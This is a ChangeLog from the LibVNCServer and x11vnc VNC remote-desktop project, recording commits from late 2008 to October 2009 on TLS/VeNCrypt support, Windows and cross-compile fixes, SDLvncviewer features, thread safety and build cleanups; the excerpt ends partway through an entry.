2009-10-30  Alexander Dorokhine <arrenlex@gmail.com>

	* libvncclient/rfbproto.c, libvncclient/vncviewer.c,
	rfb/rfbclient.h: libvncclient: Add FinishedFrameBufferUpdate
	callback When working on a program which searches the display for some image,
	one does not want to search again without getting an FB update.  Add
	a callback to make this possible.

2009-10-30  Alexander Dorokhine <arrenlex@gmail.com>

	* libvncclient/sockets.c: Fix hostname resolution problems under
	Windows On Windows, the WSA system needs to be initialized to be able to
	look up host names.  This patch also changes *addr = 0 to use the constant
	INADDR_LOOPBACK instead, which seems to be required on Windows.

2009-10-17  runge <runge@karlrunge.com>

	* x11vnc/ChangeLog, x11vnc/README, x11vnc/cleanup.c, x11vnc/help.c,
	x11vnc/solid.c, x11vnc/sslhelper.c, x11vnc/x11vnc.1,
	x11vnc/x11vnc.c, x11vnc/x11vnc_defs.c: Workaround for inane
	X_ShmAttach incompatibility in Xorg, -solid support in xfce,
	showrfbauth option.

2009-10-08  runge <runge@karlrunge.com>

	* x11vnc/misc/enhanced_tightvnc_viewer/README,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/ssvnc,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/util/ss_vncviewer,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/util/ssvnc.tcl,
	x11vnc/misc/enhanced_tightvnc_viewer/man/man1/ssvnc.1,
	x11vnc/misc/enhanced_tightvnc_viewer/man/man1/ssvncviewer.1,
	x11vnc/misc/enhanced_tightvnc_viewer/src/patches/_bundle,
	x11vnc/misc/enhanced_tightvnc_viewer/src/patches/tight-vncviewer-fu
	ll.patch: Synchronize ssvnc source, etc.   Nearly the 1.0.24
	release...

2009-10-08  runge <runge@karlrunge.com>

	* classes/ssl/tightvnc-1.3dev7_javasrc-vncviewer-ssl.patch,
	x11vnc/ChangeLog, x11vnc/README, x11vnc/connections.c,
	x11vnc/connections.h, x11vnc/enc.h, x11vnc/help.c,
	x11vnc/keyboard.c, x11vnc/options.c, x11vnc/options.h,
	x11vnc/params.h, x11vnc/remote.c, x11vnc/remote.h, x11vnc/screen.c,
	x11vnc/selection.c, x11vnc/selection.h, x11vnc/solid.c,
	x11vnc/solid.h, x11vnc/sslcmds.c, x11vnc/sslcmds.h,
	x11vnc/sslhelper.c, x11vnc/sslhelper.h, x11vnc/ssltools.h,
	x11vnc/tkx11vnc, x11vnc/tkx11vnc.h, x11vnc/unixpw.c,
	x11vnc/unixpw.h, x11vnc/user.c, x11vnc/util.c, x11vnc/util.h,
	x11vnc/x11vnc.1, x11vnc/x11vnc.c, x11vnc/x11vnc_defs.c,
	x11vnc/xdamage.c, x11vnc/xdamage.h, x11vnc/xevents.c,
	x11vnc/xevents.h, x11vnc/xwrappers.c: Huge number of changes, see
	x11vnc/ChangeLog

2009-10-07  runge <runge@karlrunge.com>

	* libvncclient/rfbproto.c: Some broken build environments treat
	fprintf(fh, buf) as a fatal error...

2009-10-07  runge <runge@karlrunge.com>

	* libvncserver/main.c: Some broken build environments treat
	fprintf(fh, buf) as a fatal error...

2009-10-02  Vic Lee <llyzs@163.com>

	* libvncclient/rfbproto.c, libvncclient/tls.c, rfb/rfbclient.h,
	rfb/rfbproto.h: Add VeNCrypt support in libvncclient Signed-off-by: Vic Lee <llyzs@163.com>

2009-10-02  Christian Beier <dontmind@freeshell.org>

	* configure.ac, libvncclient/rfbproto.c, libvncclient/sockets.c,
	rfb/rfb.h, vncterm/Makefile.am: mingw32 crosscompile fixes.  SOCKET is redefined in winsock2.h so #undef it where winsock2.h is
	included. The changes in rfbproto.c circumvent crosscompiler errors
	like 'S_IFMT' undeclared ...', the Makefile.am changes avoid
	building linux specific stuff for a win32 host target.  Also added
	configure option to specify sdl-config.  Signed-off-by: Christian Beier <dontmind@freeshell.org>
	Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2009-10-02  Johannes Schindelin <johannes.schindelin@gmx.de>

	* configure.ac: Fallback to --without-client-tls if GNUTLS could not
	be found Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2009-10-01  Vic Lee <llyzs@163.com>

	* configure.ac, libvncclient/Makefile.am, libvncclient/rfbproto.c,
	libvncclient/sockets.c, libvncclient/tls.c, libvncclient/tls.h,
	libvncclient/vncviewer.c, rfb/rfbclient.h, rfb/rfbproto.h: Add
	anonymous TLS support in libvncclient Signed-off-by: Vic Lee <llyzs@163.com>

2009-10-02  Johannes Schindelin <johannes.schindelin@gmx.de>

	* test/encodingstest.c: encodingstest: fix multi-threading issue Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2009-10-02  Johannes Schindelin <johannes.schindelin@gmx.de>

	* test/encodingstest.c: encodingstest: fix whitespace Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2009-10-02  Johannes Schindelin <johannes.schindelin@gmx.de>

	* AUTHORS: Add Christian Beier to the AUTHORS Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2009-10-02  Christian Beier <dontmind@freeshell.org>

	* libvncclient/rfbproto.c: Fix IsUnixSocket() This is a pure functionality fix: according to its manpage, stat()
	returns 0 on success. Checking for a return value of zero fixes
	incorrect results of IsUnixSocket().  Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2009-09-27  Johannes Schindelin <johannes.schindelin@gmx.de>

	* AUTHORS: Add Vic Lee to the author list Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2009-09-14  Vic Lee <llyzs@163.com>

	* libvncclient/rfbproto.c: Fix bug for logging unsupported security
	types Signed-off-by: Vic Lee <llyzs@163.com>

2009-09-14  Vic Lee <llyzs@163.com>

	* libvncclient/rfbproto.c: Fix bug for VNC Server version 4 Signed-off-by: Vic Lee <llyzs@163.com>

2009-08-10  runge <runge@karlrunge.com>

	* x11vnc/README, x11vnc/connections.c, x11vnc/enc.h, x11vnc/help.c,
	x11vnc/pointer.c, x11vnc/unixpw.c, x11vnc/unixpw.h, x11vnc/user.c,
	x11vnc/x11vnc.1, x11vnc/x11vnc.c, x11vnc/x11vnc_defs.c: Improvements
	to -unixpw_cmd and -unixpw_nis.  Experimental X11VNC_WATCH_DX_DY=1
	for buggy theme menus, see:
	http://ubuntuforums.org/showthread.php?t=1223490

2009-07-11  runge <runge@karlrunge.com>

	* prepare_x11vnc_dist.sh, x11vnc/README, x11vnc/help.c,
	x11vnc/x11vnc.1, x11vnc/x11vnc_defs.c: Setup for x11vnc version
	0.9.9

2009-06-19  runge <runge@karlrunge.com>

	* classes/ssl/README,
	classes/ssl/tightvnc-1.3dev7_javasrc-vncviewer-ssl.patch,
	classes/ssl/ultravnc-102-JavaViewer-ssl-etc.patch, x11vnc/README: 
	Add proxyHost and proxyPort java applet params.

2009-06-18  runge <runge@karlrunge.com>

	* classes/ssl/ss_vncviewer,
	classes/ssl/tightvnc-1.3dev7_javasrc-vncviewer-ssl.patch,
	classes/ssl/ultravnc-102-JavaViewer-ssl-etc.patch,
	x11vnc/ChangeLog, x11vnc/README,
	x11vnc/misc/enhanced_tightvnc_viewer/README,
	x11vnc/misc/enhanced_tightvnc_viewer/Windows/README.txt,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/ssvnc_cmd,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/util/ss_vncviewer,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/util/ssvnc.tcl,
	x11vnc/misc/enhanced_tightvnc_viewer/build.unix,
	x11vnc/misc/enhanced_tightvnc_viewer/man/man1/ssvncviewer.1,
	x11vnc/misc/enhanced_tightvnc_viewer/src/patches/tight-vncviewer-fu
	ll.patch: classes/ssl: java viewer now handles auth-basic proxy
	logins.  misc/enhanced_tightvnc_viewer: update ssvnc.

2009-06-16  Johannes Schindelin <johannes.schindelin@gmx.de>

	* libvncclient/vncviewer.c: Fix two issues in rfbGetClient() There was an unnecessary assignment, and an assignment of a string
	that was to be free()ed later, so it has to be strdup()ed.  Both issues spotted by Roman Held.  Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2009-06-14  runge <runge@karlrunge.com>

	* x11vnc/ChangeLog, x11vnc/README, x11vnc/connections.c,
	x11vnc/help.c, x11vnc/screen.c, x11vnc/sslhelper.c,
	x11vnc/x11vnc.1, x11vnc/x11vnc.c, x11vnc/x11vnc_defs.c: 
	X11VNC_REFLECT_PASSWORD env. var., warning about compiz, improve
	single-port.

2009-05-22  Stefan Becker <stefanb2@users.sourceforge.net>

	* libvncclient/vncviewer.c: Add close() to rfbClientCleanup() Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2009-05-21  runge <runge@karlrunge.com>

	* x11vnc/8to24.c, x11vnc/ChangeLog, x11vnc/README,
	x11vnc/connections.c, x11vnc/connections.h, x11vnc/cursor.c,
	x11vnc/help.c, x11vnc/keyboard.c, x11vnc/misc/turbovnc/convert,
	x11vnc/options.c, x11vnc/options.h, x11vnc/rates.c,
	x11vnc/remote.c, x11vnc/scan.c, x11vnc/screen.c,
	x11vnc/sslhelper.c, x11vnc/unixpw.c, x11vnc/user.c,
	x11vnc/userinput.c, x11vnc/util.c, x11vnc/util.h, x11vnc/x11vnc.1,
	x11vnc/x11vnc.c, x11vnc/x11vnc_defs.c, x11vnc/xevents.c,
	x11vnc/xrecord.c, x11vnc/xwrappers.c: Thread safety.  Fix -clip -in
	-rawfb.  Try to avoid Xorg stuck key bug.

2009-05-21  runge <runge@karlrunge.com>

	* ChangeLog, configure.ac, libvncserver/main.c,
	libvncserver/rfbserver.c, libvncserver/tight.c,
	libvncserver/tightvnc-filetransfer/rfbtightserver.c,
	libvncserver/zlib.c, libvncserver/zrle.c,
	libvncserver/zrleencodetemplate.c, rfb/rfb.h: Thread safety for
	zrle, zlib, tight.  Proposed tight security type fix for debian bug
	517422.

2009-05-20  llyzs <llyzs@163.com>

	* rfb/rfbclient.h: Export the functions SupportsClient2Server and
	SupportsServer2Client These are useful functions for VNC clients, so let's export them for
	everybody to use.  Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2009-05-12  Johannes Schindelin <johannes.schindelin@gmx.de>

	* AUTHORS: Add Ben to the authors Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2009-05-12  Johannes Schindelin <johannes.schindelin@gmx.de>

	* autogen.sh: Make autogen.sh executable Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2009-05-12  Ben Klopfenstein <benklop@gmail.com>

	* libvncclient/rfbproto.c, libvncclient/sockets.c, rfb/rfbclient.h: 
	libvncclient: Unix sockets support by Ben Klopfenstein Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2009-03-31  runge <runge@karlrunge.com>

	* x11vnc/README, x11vnc/connections.c, x11vnc/connections.h,
	x11vnc/screen.c, x11vnc/x11vnc.1, x11vnc/x11vnc.h,
	x11vnc/x11vnc_defs.c: rebuild for x11vnc dev 0.9.8

2009-03-31  runge <runge@karlrunge.com>

	* prepare_x11vnc_dist.sh: x11vnc 0.9.8 dev

2009-03-30  Johannes Schindelin <johannes.schindelin@gmx.de>

	* success.html: Add LCD4Linux to the success stories Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2009-03-16  runge <runge@karlrunge.com>

	* x11vnc/README, x11vnc/enc.h, x11vnc/help.c, x11vnc/keyboard.c,
	x11vnc/util.c, x11vnc/x11vnc.1, x11vnc/x11vnc.c,
	x11vnc/x11vnc_defs.c: Add some -remap tricks.  Limit rfbCFD message
	count.

2009-03-14  runge <runge@karlrunge.com>

	* x11vnc/8to24.c, x11vnc/8to24.h, x11vnc/README,
	x11vnc/allowed_input_t.h, x11vnc/avahi.c, x11vnc/avahi.h,
	x11vnc/blackout_t.h, x11vnc/cleanup.c, x11vnc/cleanup.h,
	x11vnc/connections.c, x11vnc/connections.h, x11vnc/cursor.c,
	x11vnc/cursor.h, x11vnc/enc.h, x11vnc/enums.h, x11vnc/gui.c,
	x11vnc/gui.h, x11vnc/help.c, x11vnc/help.h, x11vnc/inet.c,
	x11vnc/inet.h, x11vnc/keyboard.c, x11vnc/keyboard.h,
	x11vnc/linuxfb.c, x11vnc/linuxfb.h, x11vnc/macosx.c,
	x11vnc/macosx.h, x11vnc/macosxCG.c, x11vnc/macosxCG.h,
	x11vnc/macosxCGP.c, x11vnc/macosxCGP.h, x11vnc/macosxCGS.c,
	x11vnc/macosxCGS.h, x11vnc/misc/LICENSE,
	x11vnc/misc/turbovnc/Makefile.am, x11vnc/misc/turbovnc/README,
	x11vnc/misc/turbovnc/apply_turbovnc, x11vnc/misc/turbovnc/convert,
	x11vnc/misc/turbovnc/convert_rfbserver,
	x11vnc/misc/turbovnc/undo_turbovnc, x11vnc/options.c,
	x11vnc/options.h, x11vnc/params.h, x11vnc/pm.c, x11vnc/pm.h,
	x11vnc/pointer.c, x11vnc/pointer.h, x11vnc/rates.c, x11vnc/rates.h,
	x11vnc/remote.c, x11vnc/remote.h, x11vnc/scan.c, x11vnc/scan.h,
	x11vnc/screen.c, x11vnc/screen.h, x11vnc/scrollevent_t.h,
	x11vnc/selection.c, x11vnc/selection.h, x11vnc/solid.c,
	x11vnc/solid.h, x11vnc/sslcmds.c, x11vnc/sslcmds.h,
	x11vnc/sslhelper.c, x11vnc/sslhelper.h, x11vnc/ssltools.h,
	x11vnc/tkx11vnc, x11vnc/tkx11vnc.h, x11vnc/uinput.c,
	x11vnc/uinput.h, x11vnc/unixpw.c, x11vnc/unixpw.h, x11vnc/user.c,
	x11vnc/user.h, x11vnc/userinput.c, x11vnc/userinput.h,
	x11vnc/util.c, x11vnc/util.h, x11vnc/v4l.c, x11vnc/v4l.h,
	x11vnc/win_utils.c, x11vnc/win_utils.h, x11vnc/winattr_t.h,
	x11vnc/x11vnc.1, x11vnc/x11vnc.c, x11vnc/x11vnc.h,
	x11vnc/x11vnc_defs.c, x11vnc/xdamage.c, x11vnc/xdamage.h,
	x11vnc/xevents.c, x11vnc/xevents.h, x11vnc/xinerama.c,
	x11vnc/xinerama.h, x11vnc/xkb_bell.c, x11vnc/xkb_bell.h,
	x11vnc/xrandr.c, x11vnc/xrandr.h, x11vnc/xrecord.c,
	x11vnc/xrecord.h, x11vnc/xwrappers.c, x11vnc/xwrappers.h: Insert
	x11vnc copyright and license notices.

2009-03-14  runge <runge@karlrunge.com>

	* x11vnc/README: Test git commit setting username & etc.

2009-03-14  Karl J. Runge <runge@haystack.runge.home>

	* x11vnc/README, x11vnc/help.c, x11vnc/ssltools.h, x11vnc/user.c,
	x11vnc/x11vnc.1, x11vnc/x11vnc_defs.c: Tweak settings and docs for
	create_display.  Add FD_EXTRA finishing cmd.

2009-03-13  runge <runge>

	* x11vnc/ChangeLog, x11vnc/README, x11vnc/screen.c,
	x11vnc/userinput.c, x11vnc/x11vnc.1, x11vnc/x11vnc.c,
	x11vnc/x11vnc_defs.c: x11vnc: Fix off-screen bug for -ncache_cr
	copyrect.

2009-03-12  dscho <dscho>

	* ChangeLog, client_examples/SDLvncviewer.c: Teach SDLvncviewer
	about scroll wheel events Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2009-03-12  dscho <dscho>

	* client_examples/SDLvncviewer.c: SDLvncviewer: fix passing a wrong
	pointer type Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2009-03-08  dscho <dscho>

	* ChangeLog, client_examples/Makefile.am,
	client_examples/SDLvncviewer.c, client_examples/scrap.c,
	client_examples/scrap.h: Clipboard support for SDLvncviewer The clipboard support has only been tested on Linux so far.  Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2009-03-07  runge <runge>

	* x11vnc/ChangeLog, x11vnc/README, x11vnc/connections.c,
	x11vnc/help.c, x11vnc/misc/turbovnc/Makefile.am,
	x11vnc/misc/turbovnc/README, x11vnc/misc/turbovnc/apply_turbovnc,
	x11vnc/misc/turbovnc/convert,
	x11vnc/misc/turbovnc/convert_rfbserver,
	x11vnc/misc/turbovnc/undo_turbovnc, x11vnc/scan.c,
	x11vnc/sslhelper.c, x11vnc/ssltools.h, x11vnc/user.c,
	x11vnc/user.h, x11vnc/x11vnc.1, x11vnc/x11vnc_defs.c: Allow range
	for X11VNC_SKIP_DISPLAY, document grab Xserver issue.  Add
	progress_client() to proceed more quickly thru handshake.
	Improvements to turbovnc hack.

2009-03-07  dscho <dscho>

	* ChangeLog, TODO, client_examples/SDLvncviewer.c: SDLvncviewer:
	upon focus loss, force releasing the Alt keys When switching windows using the Alt+Tab shortcut, SDLvncviewer
	would get the "down" event, but not the "up" event.  This patch
	provides a workaround.  Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2009-03-07  dscho <dscho>

	* client_examples/SDLvncviewer.c: SDLvncviewer: refactor event
	handling Instead of having deep indent levels, put the code to handle events
	into its own function.  That also helps readability.  Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2009-03-07  dscho <dscho>

	* TODO: Update SDLvncviewer TODOs Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2009-03-07  dscho <dscho>

	* ChangeLog, client_examples/SDLvncviewer.c: Teach SDLvncviewer to
	be resizable Using "SDLvncviewer -resizable", you make the window resizable.
	This means that you can shrink the window (e.g. when you are trying
	to access an x11vnc from your little netbook), or you can enlarge
	it.  Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2009-03-06  dscho <dscho>

	* ChangeLog, TODO, client_examples/SDLvncviewer.c: SDLvncviewer:
	enable key repeat Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2009-02-28  runge <runge>

	* configure.ac, x11vnc/ChangeLog, x11vnc/README,
	x11vnc/misc/Makefile.am, x11vnc/misc/turbovnc/Makefile.am,
	x11vnc/misc/turbovnc/README, x11vnc/misc/turbovnc/apply_turbovnc,
	x11vnc/misc/turbovnc/convert, x11vnc/misc/turbovnc/tight.c,
	x11vnc/misc/turbovnc/turbojpeg.h,
	x11vnc/misc/turbovnc/undo_turbovnc: x11vnc: add kludge to experiment
	with turbovnc.

2009-02-26  runge <runge>

	* x11vnc/ChangeLog, x11vnc/README, x11vnc/remote.c,
	x11vnc/tkx11vnc, x11vnc/tkx11vnc.h, x11vnc/x11vnc.1,
	x11vnc/x11vnc_defs.c: x11vnc: fix some -QD cases for use in
	tkx11vnc.

2009-02-22  runge <runge>

	* x11vnc/README, x11vnc/avahi.c, x11vnc/enc.h, x11vnc/selection.c: 
	fix some compiler warnings.

2009-02-22  runge <runge>

	* x11vnc/ChangeLog, x11vnc/README, x11vnc/help.c, x11vnc/x11vnc.1,
	x11vnc/x11vnc.c, x11vnc/x11vnc_defs.c: add -noskip_lockkeys option
	for future use.

2009-02-04  runge <runge>

	* classes/ssl/README,
	classes/ssl/ultravnc-102-JavaViewer-ssl-etc.patch,
	x11vnc/ChangeLog, x11vnc/README, x11vnc/help.c, x11vnc/remote.c,
	x11vnc/screen.c, x11vnc/selection.c, x11vnc/sslhelper.c,
	x11vnc/ssltools.h, x11vnc/unixpw.c, x11vnc/user.c,
	x11vnc/userinput.c, x11vnc/x11vnc.1, x11vnc/x11vnc.c,
	x11vnc/x11vnc_defs.c, x11vnc/xwrappers.c: x11vnc: Add "sendbell"
	remote cmd.  Fix copyrect updates under -reflect.  Workaround that
	checks valid window of selection requestor.  Wait on some ssl helper
	pids earlier.  Workaround XAUTHLOCALHOSTNAME for some new usage
	modes.  Set fake fb to requested bpp with correct masks.  -padgeom
	once:... mode.  Set LIBXCB_ALLOW_SLOPPY_LOCK by default.
	rfbRandomBytes earlier.  classes/ssl: Update jars.  Add "TOP_"
	dropdown customization to ultravnc java viewer applet FTP panel.

2009-02-03  dscho <dscho>

	* test/Makefile.am: test/Makefile: use check_PROGRAMS Rather than use noinst_PROGRAMS, check_PROGRAMS will define programs
	that are only compiled when someone actually runs `make check`.  Signed-off-by: Mike Frysinger <vapier@gentoo.org> Signed-off-by:
	Johannes Schindelin <johannes.schindelin@gmx.de>

2009-02-03  dscho <dscho>

	* ChangeLog: Record Mike's automake cleanups Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2009-02-03  dscho <dscho>

	* Makefile.am, client_examples/Makefile.am, configure.ac,
	contrib/Makefile.am, examples/Makefile.am,
	libvncclient/Makefile.am, libvncserver/Makefile.am,
	test/Makefile.am, vncterm/Makefile.am, x11vnc/Makefile.am: clean up
	build flags The flag handling (both compiler options and include paths) are a
	mess at the moment.  There is no point in forcing "-O2 -g" when
	these are already the defaults, and if someone changes the defaults,
	chances are good they don't want you clobbering their choices.  The -Wall flag should be handled in configure and thrown into CFLAGS
	once rather than every Makefile.am.  Plus, this way we can control
	which compilers the flag actually gets used with.  Finally, the INCLUDES variable is for -I paths, not AM_CFLAGS.  Nor
	should it contain -I. as this is already in the default includes
	setup.  Signed-off-by: Mike Frysinger <vapier@gentoo.org> Signed-off-by:
	Johannes Schindelin <johannes.schindelin@gmx.de>

2009-02-03  dscho <dscho>

	* configure.ac: configure: use _cv_ in cache var name Newer autoconf fails if _cv_ is not in the cache var name.  Signed-off-by: Mike Frysinger <vapier@gentoo.org> Signed-off-by:
	Johannes Schindelin <johannes.schindelin@gmx.de>

2009-02-03  dscho <dscho>

	* configure.ac: configure: use AM_PROG_CC_C_O Newer automakes error out due to per-file CFLAGS being used unless
	the macro AM_PROG_CC_C_O is set in configure.ac.  [jes: The macro AM_PROG_CC_C_O has been around since 1999, so it
	 should be safe.] Signed-off-by: Mike Frysinger <vapier@gentoo.org> Signed-off-by:
	Johannes Schindelin <johannes.schindelin@gmx.de>

2009-02-03  dscho <dscho>

	* autogen.sh: autogen.sh: run with set -e If any autotool command fails, we want to abort, not keep running.
	Otherwise, errors in say a Makefile.am will be missed as the
	automake failure gets ignored and then lost in the noise.  Signed-off-by: Mike Frysinger <vapier@gentoo.org> Signed-off-by:
	Johannes Schindelin <johannes.schindelin@gmx.de>

2009-01-12  runge <runge>

	* x11vnc/misc/enhanced_tightvnc_viewer/bin/ssvnc,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/ssvnc_cmd,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/util/ss_vncviewer,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/util/ssvnc.tcl,
	x11vnc/misc/enhanced_tightvnc_viewer/man/man1/ssvnc.1,
	x11vnc/misc/enhanced_tightvnc_viewer/man/man1/ssvncviewer.1,
	x11vnc/misc/enhanced_tightvnc_viewer/src/patches/_bundle,
	x11vnc/misc/enhanced_tightvnc_viewer/src/patches/tight-vncviewer-fu
	ll.patch: SSVNC 1.0.22 release (+ a little bit more).  crl lists,
	ssh pid finding improvements, and more.

2009-01-12  runge <runge>

	* CMakeLists.txt, ChangeLog, configure.ac: configure.ac,
	CMakeLists.txt: set LibVNCServer version to 0.9.7

2009-01-12  runge <runge>

	* classes/ssl/README, classes/ssl/ss_vncviewer,
	classes/ssl/ultravnc-102-JavaViewer-ssl-etc.patch,
	x11vnc/ChangeLog, x11vnc/README, x11vnc/x11vnc.1, x11vnc/x11vnc.c,
	x11vnc/x11vnc_defs.c: classes/ssl: Add configurable Ultra java
	applet Filexfer Drives drop down (e.g.
	ftpDropDown=Home.Desktop.bin).  Document all applet parameters in
	classes/ssl/README.

2009-01-11  runge <runge>

	* ChangeLog: Forgot ChangeLog

2009-01-11  runge <runge>

	* prepare_x11vnc_dist.sh: prepare_x11vnc_dist.sh: fix SUBDIRS and
	DIST_SUBDRIS when using --with-system-libvncserver

2009-01-10  runge <runge>

	* x11vnc/8to24.c, x11vnc/ChangeLog, x11vnc/README, x11vnc/screen.c,
	x11vnc/selection.c, x11vnc/x11vnc.1, x11vnc/x11vnc_defs.c,
	x11vnc/xrecord.c: x11vnc: fix failure of -8to24 on default depth 24
	due to nonstandard indexed color support changes.  Fix small window
	for failure after XSendEvent selection call; add env var.
	X11VNC_SENDEVENT_SYNC=1 to take even more care.

2009-01-04  runge <runge>

	* x11vnc/README, x11vnc/avahi.c, x11vnc/cleanup.c,
	x11vnc/connections.c, x11vnc/connections.h, x11vnc/enc.h,
	x11vnc/gui.c, x11vnc/scan.c, x11vnc/screen.c, x11vnc/solid.c,
	x11vnc/sslhelper.c, x11vnc/x11vnc.c, x11vnc/xwrappers.c: x11vnc: fix
	compiler warnings.

2009-01-04  runge <runge>

	* x11vnc/ChangeLog, x11vnc/README, x11vnc/cleanup.c,
	x11vnc/connections.c, x11vnc/help.c, x11vnc/linuxfb.c,
	x11vnc/options.c, x11vnc/options.h, x11vnc/pointer.c,
	x11vnc/remote.c, x11vnc/scan.c, x11vnc/screen.c,
	x11vnc/sslhelper.c, x11vnc/v4l.c, x11vnc/x11vnc.1, x11vnc/x11vnc.c,
	x11vnc/x11vnc.h, x11vnc/x11vnc_defs.c, x11vnc/xwrappers.c: x11vnc:
	add -rmflag option, -rawfb vt support, bpp < 8 support for rawfb,
	find /dev/video better. Fix reverse SSL connection for DH.  Some
	improvements for CUPS TS helper, restart if needed.

2009-01-04  runge <runge>

	* configure.ac, prepare_x11vnc_dist.sh: configure.ac: add include
	file file for libXrandr on Solaris.  prepare_x11vnc_dist.sh: set
	version to 0.9.7

2008-12-10  runge <runge>

	* x11vnc/ChangeLog, x11vnc/README, x11vnc/connections.c,
	x11vnc/help.c, x11vnc/options.c, x11vnc/options.h, x11vnc/params.h,
	x11vnc/remote.c, x11vnc/sslhelper.c, x11vnc/ssltools.h,
	x11vnc/tkx11vnc, x11vnc/tkx11vnc.h, x11vnc/user.c,
	x11vnc/userinput.c, x11vnc/util.c, x11vnc/x11vnc.1,
	x11vnc/x11vnc.c, x11vnc/x11vnc_defs.c: x11vnc: 0.9.6 release.  Some
	strtok bugfixes. rename -tlsvnc to -anontls.  Disable ssl caching.
	No cert creation prompting in inetd or bg modes.  waitpid a bit more
	carefully on ssl helpers.  Tune ssl initial timeouts.  Let -create
	user specify starting X display.  fix -rfbport prompt gui for older
	tk.  -sslonly option. Error if no -ssl with related options. -rand
	option.  -ssl implies -ssl SAVE

2008-11-22  runge <runge>

	* classes/ssl/ss_vncviewer: Update ss_vncviewer...

2008-11-22  runge <runge>

	* x11vnc/misc/enhanced_tightvnc_viewer/README,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/ssvnc,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/ssvnc_cmd,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/util/ss_vncviewer,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/util/ssvnc.tcl,
	x11vnc/misc/enhanced_tightvnc_viewer/man/man1/ssvnc.1,
	x11vnc/misc/enhanced_tightvnc_viewer/src/patches/_bundle,
	x11vnc/misc/enhanced_tightvnc_viewer/src/patches/stunnel-maxconn.pa
	tch,
	x11vnc/misc/enhanced_tightvnc_viewer/src/patches/tight-vncviewer-fu
	ll.patch, x11vnc/misc/enhanced_tightvnc_viewer/ssvnc.desktop: SSVNC
	  sync: stunnel upgrade and patch, change wish order, -anondh -ciphers
	  option VeNCrypt and TLSVNC support (in pproxy and unix vncviewer).
	  Help text tweaks -killstunnel, s_client fixes, No Encryption easier.
	  Zeroconf/avahi support.  tk font fixes. SSVNC_ULTRA_FTP_JAR finding
	  SSVNC_PREDIGESTED_HANDSHAKE SSVNC_SKIP_RFB_PROTOCOL_VERSION,
	SSVNC_SET_SECURITY_TYPE, etc hacks.

2008-11-22  runge <runge>

	* x11vnc/ChangeLog, x11vnc/Makefile.am, x11vnc/README,
	x11vnc/avahi.c, x11vnc/cleanup.c, x11vnc/connections.c,
	x11vnc/gui.c, x11vnc/help.c, x11vnc/options.c, x11vnc/options.h,
	x11vnc/params.h, x11vnc/remote.c, x11vnc/scan.c, x11vnc/screen.c,
	x11vnc/sslcmds.c, x11vnc/sslhelper.c, x11vnc/sslhelper.h,
	x11vnc/ssltools.h, x11vnc/tkx11vnc, x11vnc/tkx11vnc.h,
	x11vnc/unixpw.c, x11vnc/unixpw.h, x11vnc/userinput.c,
	x11vnc/x11vnc.1, x11vnc/x11vnc.c, x11vnc/x11vnc.desktop,
	x11vnc/x11vnc.h, x11vnc/x11vnc_defs.c, x11vnc/xdamage.c,
	x11vnc/xdamage.h, x11vnc/xevents.c, x11vnc/xrecord.c,
	x11vnc/xrecord.h, x11vnc/xwrappers.c: x11vnc: x11vnc.desktop file.
	  -reopen, -dhparams, -sslCRL, -setdefer options. -rfbport PROMPT
	  VeNCrypt and TLSVNC SSL/TLS encryption support.  Tweaks to
	  choose_delay() algorithm.  -ssl ANON anonymouse Diffie-Hellman mode.
	  Fix bugs in certs management.  Additions to tray=setpass naive user
	mode.

2008-11-05  runge <runge>

	* x11vnc/ChangeLog, x11vnc/README, x11vnc/avahi.c,
	x11vnc/cleanup.c, x11vnc/cleanup.h, x11vnc/help.c,
	x11vnc/macosxCG.c, x11vnc/rates.c, x11vnc/remote.c,
	x11vnc/screen.c, x11vnc/solid.c, x11vnc/sslhelper.c,
	x11vnc/ssltools.h, x11vnc/userinput.c, x11vnc/x11vnc.1,
	x11vnc/x11vnc.c, x11vnc/x11vnc.h, x11vnc/x11vnc_defs.c,
	x11vnc/xevents.c: x11vnc: add zeroconf external helpers
	(avahi-publish and dns-sd).  Alias -zeroconf.  Close pipeinput_fh on
	exit.  Kludge to make -solid work on MacOSX console.  Attempt at cpp
	macros to disable newer libvncserver interfaces.

2008-11-05  runge <runge>

	* configure.ac: Tweak messages.  Add shmat for --without-x building.

2008-10-30  runge <runge>

	* x11vnc/misc/enhanced_tightvnc_viewer/README,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/util/ss_vncviewer,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/util/ssvnc.tcl,
	x11vnc/misc/enhanced_tightvnc_viewer/man/man1/ssvncviewer.1,
